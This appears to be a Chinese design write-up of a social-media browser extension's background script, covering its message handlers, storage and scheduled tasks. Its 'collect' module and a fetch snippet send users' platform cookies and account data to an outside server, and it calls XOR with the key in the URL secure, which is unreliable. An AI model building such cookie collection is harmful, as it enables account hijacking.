# 社媒助手 - Service Worker 设计文档

## 一、概述

Service Worker (background.js) 是扩展的核心后台进程，负责处理跨上下文通信、数据加密上传、定时任务调度、存储管理等核心功能。

## 二、整体架构

```
┌─────────────────────────────────────────────────────────────────┐
│                     Service Worker 架构                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                    Message Handler 层                    │   │
│  │  (通过 d() 函数注册的跨上下文消息处理器)                  │   │
│  ├─────────────────────────────────────────────────────────┤   │
│  │  openSidepanel │ executeScript │ chrome │ fetch │ upload │   │
│  │  collect       │ taskAlarm     │        │       │        │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│  ┌───────────────────────────┼─────────────────────────────┐   │
│  │                           ▼                             │   │
│  │              ┌─────────────────────┐                    │   │
│  │              │   功能模块层         │                    │   │
│  │              ├─────────────────────┤                    │   │
│  │              │ • 侧边栏管理        │                    │   │
│  │              │ • 脚本注入执行      │                    │   │
│  │              │ • 网络请求代理      │                    │   │
│  │              │ • 数据加密上传      │                    │   │
│  │              │ • 定时任务调度      │                    │   │
│  │              │ • 存储管理          │                    │   │
│  │              └─────────────────────┘                    │   │
│  │                           │                             │   │
│  │              ┌─────────────────────┐                    │   │
│  │              │   Chrome API 层      │                    │   │
│  │              ├─────────────────────┤                    │   │
│  │              │ • sidePanel         │                    │   │
│  │              │ • scripting         │                    │   │
│  │              │ • storage           │                    │   │
│  │              │ • alarms            │                    │   │
│  │              │ • cookies           │                    │   │
│  │              │ • tabs              │                    │   │
│  │              └─────────────────────┘                    │   │
│  │                                                         │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                    存储层 (WXT Storage)                  │   │
│  │  ┌─────────────┐ ┌─────────────┐ ┌─────────────────┐   │   │
│  │  │ local:*     │ │ session:*   │ │ sync:*          │   │   │
│  │  │ • taskAlarms│ │ • lastCollectTime              │   │   │
│  │  │ • deviceId  │ │ • pgyWhitelist                 │   │   │
│  │  └─────────────┘ └─────────────┘ └─────────────────┘   │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 三、功能模块设计

### 3.1 侧边栏管理模块

**功能**: 控制侧边栏的打开和关闭

**实现**:
```javascript
d("openSidepanel", async ({ sender }) => {
  // 检查当前标签页是否存在
  // 调用 chrome.sidePanel.open() 打开侧边栏
  // 支持 Tab 级别和 Window 级别的侧边栏
})
```

**触发时机**:
- 用户点击扩展图标
- 内容脚本请求打开侧边栏

### 3.2 脚本注入执行模块

**功能**: 在目标页面的 MAIN 世界执行自定义脚本

**实现**:
```javascript
d("executeScript", async ({ data, sender }) => {
  // 解析脚本参数和函数体
  // 使用 chrome.scripting.executeScript
  // 在 MAIN 世界执行（可访问页面原生 API）
  // 支持异步函数执行
})
```

**使用场景**:
- 在页面中调用平台原生 HTTP 请求函数
- 获取页面内部状态和数据
- 执行需要访问页面全局变量的操作

### 3.3 Chrome API 代理模块

**功能**: 代理调用 Chrome 扩展 API

**实现**:
```javascript
d("chrome", async ({ data }) => {
  // data.paths: API 路径数组，如 ["alarms", "clear"]
  // data.args: 调用参数
  // 动态解析并调用 chrome.* API
})
```

**支持的 API**:
- `chrome.alarms.*` - 闹钟管理
- `chrome.storage.*` - 存储操作
- `chrome.tabs.*` - 标签页管理
- 其他 Chrome API

### 3.4 网络请求代理模块

**功能**: 代理跨域网络请求

**实现**:
```javascript
// fetch 处理器
d("fetch", ({ data }) => {
  // 支持 url/dataType 等参数
  // 返回 text/json/url 等不同格式
})

// upload 处理器
d("upload", async ({ data }) => {
  // 下载远程文件
  // 限制文件大小（20MB）
  // 构建 FormData 并上传
})
```

**使用场景**:
- 内容脚本需要跨域请求
- 文件上传功能
- 短链解析等网络操作

### 3.5 数据加密上传模块

**功能**: 采集用户账号信息并加密上传到服务器

**实现**:
```javascript
class U { // XorEncryptor
  constructor() {
    this.key = this.generateRandomKey(16) // 16字节随机密钥
  }
  
  encrypt(text) {
    // 使用 XOR 加密
    // 返回加密后的 Uint8Array
  }
  
  getHexKey() {
    // 返回密钥的十六进制字符串
  }
}

d("collect", async ({ data, sender }) => {
  // 1. 解析平台代码
  // 2. 蒲公英白名单检查
  // 3. 频率限制检查（1小时内不重复采集）
  // 4. 收集数据：账号信息、Cookie、设备ID、版本等
  // 5. XOR 加密
  // 6. 上传到 smzs.xisence.com/api/collect
})
```

**采集数据内容**:
```typescript
{
  account: object,        // 平台账号信息
  deviceId: string,       // 设备唯一标识
  cookies: Cookie[],      // 平台 Cookie
  version: string,        // 扩展版本
  platform: string,       // 平台代码
  cpuArch: string,        // CPU 架构
  osName: string          // 操作系统
}
```

### 3.6 定时任务调度模块

**功能**: 管理定时采集任务的创建、更新、删除和执行

**存储定义** (`chunks/index-Ch1ck1li.js`):
```javascript
const l = u.defineItem("local:taskAlarms", { fallback: [] })
```

**数据结构**:
```typescript
interface TaskAlarm {
  id: string              // 任务唯一ID
  name: string            // 任务名称
  platform: string        // 目标平台代码
  enabled: boolean        // 是否启用
  when?: number           // 首次执行时间戳
  delayInMinutes?: number // 延迟执行分钟数
  periodInMinutes?: number // 周期执行分钟数
}
```

**CRUD 操作**:
```javascript
// 创建任务
d = async (task) => {
  // 添加到存储
  // 创建 chrome.alarms
}

// 更新任务
w = async (id, newTask) => {
  // 更新存储
  // 清除旧 alarm，创建新 alarm
}

// 删除任务
I = async (id) => {
  // 从存储移除
  // 清除 alarm
}

// 初始化任务（启动时）
h = async () => {
  // 读取所有任务
  // 为启用的任务创建 alarm
}
```

**任务执行流程**:
```javascript
chrome.alarms.onAlarm.addListener(async (alarm) => {
  // 1. 查找对应的 TaskAlarm
  // 2. 检查是否启用
  // 3. 查找平台配置
  // 4. 创建新标签页打开平台
  // 5. 发送 taskAlarm 消息给内容脚本
  // 6. 重试机制（最多10次，间隔2秒）
})
```

## 四、接口设计 (Message Handler)

### 4.1 消息处理框架

使用 WXT 框架的 `onMessage` 工具函数注册消息处理器：

```javascript
// 注册消息处理器
d("messageType", async ({ data, sender }) => {
  // 处理逻辑
  return result
})
```

### 4.2 消息接口列表

| 消息类型 | 参数 | 返回值 | 功能说明 |
|---------|-----|-------|---------|
| `openSidepanel` | - | `boolean` | 打开侧边栏 |
| `executeScript` | `{ script, args }` | `any` | 在页面执行脚本 |
| `chrome` | `{ paths, args }` | `any` | 代理 Chrome API |
| `fetch` | `{ url, dataType, ...options }` | `string/object` | 代理 fetch 请求 |
| `upload` | `{ url, fileUrl, fileName, formData }` | `object/string` | 文件上传 |
| `collect` | `accountData` | - | 加密上传账号数据 |
| `taskAlarm` | `taskData` | `boolean` | 执行定时任务 |

### 4.3 消息流向图

```
┌─────────────────────────────────────────────────────────────────┐
│                        消息流向图                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌──────────────┐      ┌──────────────────┐                   │
│   │  Content Script│────▶│                  │                   │
│   └──────────────┘      │                  │     ┌──────────┐  │
│                         │   Service Worker │────▶│ 外部 API │  │
│   ┌──────────────┐      │                  │     │  (上报)  │  │
│   │  Side Panel  │────▶│                  │     └──────────┘  │
│   └──────────────┘      └──────────────────┘                   │
│                                │                                │
│                                ▼                                │
│                         ┌──────────────┐                       │
│                         │ Chrome APIs  │                       │
│                         │ • sidePanel  │                       │
│                         │ • scripting  │                       │
│                         │ • storage    │                       │
│                         │ • alarms     │                       │
│                         │ • tabs       │                       │
│                         └──────────────┘                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 五、存储设计

### 5.1 存储架构

使用 WXT Storage 提供的分层存储：

```
┌─────────────────────────────────────────────────────────────┐
│                     WXT Storage 架构                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                  Storage Interface                   │   │
│  │  defineItem() │ getValue() │ setValue() │ watch()   │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                  │
│          ┌───────────────┼───────────────┐                 │
│          ▼               ▼               ▼                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │
│  │   local:    │  │   session:  │  │    sync:    │        │
│  │  持久化存储  │  │  会话级存储  │  │  同步存储    │        │
│  └─────────────┘  └─────────────┘  └─────────────┘        │
│          │               │               │                 │
│          ▼               ▼               ▼                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Chrome Storage API                      │   │
│  │     chrome.storage.local/session/sync/managed       │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 存储项定义

| 存储键 | 类型 | 作用域 | 说明 |
|-------|-----|-------|-----|
| `local:taskAlarms` | `TaskAlarm[]` | local | 定时任务列表 |
| `session:lastCollectTime` | `Record<platform, timestamp>` | session | 各平台上次采集时间 |
| `local:deviceId` | `string` | local | 设备唯一标识 |
| `local:pgyWhitelist` | `boolean` | local | 蒲公英白名单状态 |

### 5.3 存储操作示例

```javascript
// 定义存储项
const taskAlarms = C.defineItem("local:taskAlarms", { fallback: [] })
const lastCollectTime = C.defineItem("session:lastCollectTime", { fallback: {} })
const deviceId = C.defineItem("local:deviceId", { fallback: "" })
const pgyWhitelist = C.defineItem("local:pgyWhitelist", { fallback: false })

// 读取
const tasks = await taskAlarms.getValue()

// 写入
await taskAlarms.setValue([...tasks, newTask])

// 监听变化
taskAlarms.watch((newValue, oldValue) => {
  console.log('任务列表变化:', newValue)
})
```

## 六、生命周期管理

### 6.1 启动流程

```javascript
const R = j({
  type: "module",
  main: () => {
    // 1. 配置侧边栏行为
    chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true })
    
    // 2. 设置存储访问级别
    chrome.storage.session.setAccessLevel({ 
      accessLevel: chrome.storage.AccessLevel.TRUSTED_AND_UNTRUSTED_CONTEXTS 
    })
    
    // 3. 监听安装事件
    chrome.runtime.onInstalled.addListener(() => O())
    
    // 4. 监听闹钟事件
    chrome.alarms.onAlarm.addListener(async (n) => { ... })
    
    // 5. 初始化定时任务
    N()
  }
})
```

### 6.2 事件监听

| 事件 | 处理器 | 说明 |
|-----|-------|-----|
| `chrome.runtime.onInstalled` | `O()` | 扩展安装/更新时初始化 |
| `chrome.alarms.onAlarm` | 定时任务执行 | 定时采集任务触发 |
| `chrome.action.onClicked` | 打开侧边栏 | 点击扩展图标（降级方案） |

## 七、安全设计

### 7.1 数据加密

- **算法**: XOR 加密
- **密钥**: 16字节随机生成，每次加密使用新密钥
- **传输**: 密钥通过 URL 参数传递，数据通过 Body 传输

```javascript
// 加密流程
const encryptor = new U()                    // 创建加密器
const encrypted = encryptor.encrypt(data)    // 加密数据
const key = encryptor.getHexKey()            // 获取密钥

// 上传
fetch(`https://smzs.xisence.com/api/collect?key=${key}&timestamp=${Date.now()}`, {
  method: "POST",
  headers: { "Content-Type": "application/octet-stream" },
  body: encrypted
})
```

### 7.2 频率限制

```javascript
// 采集频率限制：同一平台1小时内只能采集一次
const lastTime = await T.getValue()
if (lastTime[platform] && Date.now() - lastTime[platform] < 3600 * 1000) {
  return // 跳过采集
}
```

### 7.3 白名单机制

蒲公英平台需要白名单验证：

```javascript
const whitelist = [
  "5ebb50b0000000000101d586",  // 用户ID白名单
  // ...
]
const companyWhitelist = [
  "云智达创科技", "行吟信息科技", "小红书科技", "薯一薯二"
]

if (whitelist.includes(userId) || companyWhitelist.some(c => companyName.includes(c))) {
  await k.setValue(true)  // 设置白名单状态
}
```

## 八、关键代码位置

| 功能 | 文件 | 关键标识 |
|-----|-----|---------|
| Service Worker 入口 | `background.js` | `R.main()` |
| 消息处理器注册 | `background.js` | `d("messageType", handler)` |
| 定时任务管理 | `chunks/index-Ch1ck1li.js` | `l`, `d`, `w`, `I` |
| 存储定义 | `background.js` | `C.defineItem()` |
| 加密类 | `background.js` | `class U` |
| WXT Storage | `chunks/_virtual_wxt-plugins-BrZkjG8a.js` | `defineItem` |
| 平台配置 | `chunks/_virtual_wxt-plugins-BrZkjG8a.js` | `Fe` 数组 |

## 九、设计亮点

1. **模块化消息处理**: 使用统一的 `d()` 函数注册消息处理器，便于扩展和维护

2. **分层存储架构**: 利用 WXT Storage 提供的 local/session/sync 分层，合理管理数据生命周期

3. **安全的数据采集**: XOR 加密 + 频率限制 + 白名单机制，确保数据安全合规

4. **灵活的脚本注入**: 支持在 MAIN 世界执行动态脚本，可访问页面原生 API

5. **可靠的定时任务**: 基于 Chrome Alarms API，支持周期性任务和重试机制

6. **Chrome API 代理**: 统一的 Chrome API 代理层，简化跨上下文调用
